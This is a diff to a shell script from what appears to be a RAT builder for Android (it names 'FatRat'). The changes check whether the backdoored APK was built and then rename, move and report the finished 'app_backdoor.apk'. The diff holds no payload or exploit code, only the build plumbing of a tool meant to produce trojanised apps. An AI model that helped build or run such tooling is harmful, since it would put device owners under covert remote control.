@@ -554,27 +554,37 @@ fi
 
 rm $unaligned_apk
 
+#Checking finished apk file
+fiapk=$MY_PATH/temp/original/dist/app.apk
+if [ -f "$fiapk" ]
+then
+echo -e $green "[*] Backdoor apk created sucefully"
+else
+echo -e $red "There was a problem in the creation of your Rat apk file ,
+check $MY_PATH/logs/apk.log for more information about the error ." 
+rm -rf temp/* > /dev/null 2>&1
+exit 1
+fi
+
 #looking if already exists a previous backdoor apk created and renaming it
 ren=`shuf -i 1-1000 -n 1`
 back=$MY_PATH/backdoored/app_backdoor.apk
 if [ -f "$back" ]
 then
 mv $MY_PATH/backdoored/app_backdoor.apk $MY_PATH/backdoored/app_backdoor_$ren.apk
-fi
-
-#Moving finished backdoor file to final destination
-mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
-dest=$MY_PATH/backdoored/app_backdoor.apk
-if [ -f "$dest" ]
-then
-rm -rf temp/* > /dev/null 2>&1
 echo -e $yellow "FatRat Detected that you already had a previous created backdoor
 file in ($MY_PATH/backdoored/) with the name app_backdoor.apk ."
 echo -e $blue "FatRat have renamed your old backdoor to app_backdoor$ren.apk"
-else
-	echo -e $red"There was a problem in the creation of your Rat apk file ,
-check $MY_PATH/logs/apk.log for more information about the error ." 
+
+#Moving finished backdoor file to final destination
+mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
+echo -ne $green" Your RAT apk was successfully builded and signed , it is located here :
+ $path/backdoored/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
-exit 0
+else
+mv $MY_PATH/temp/original/dist/app.apk $MY_PATH/backdoored/app_backdoor.apk > /dev/null 2>&1
+echo -ne $green" Your RAT apk was successfully builded and signed , it is located here :
+ $path/backdoored/app_backdoor.apk"
+rm -rf temp/* > /dev/null 2>&1
 fi
 
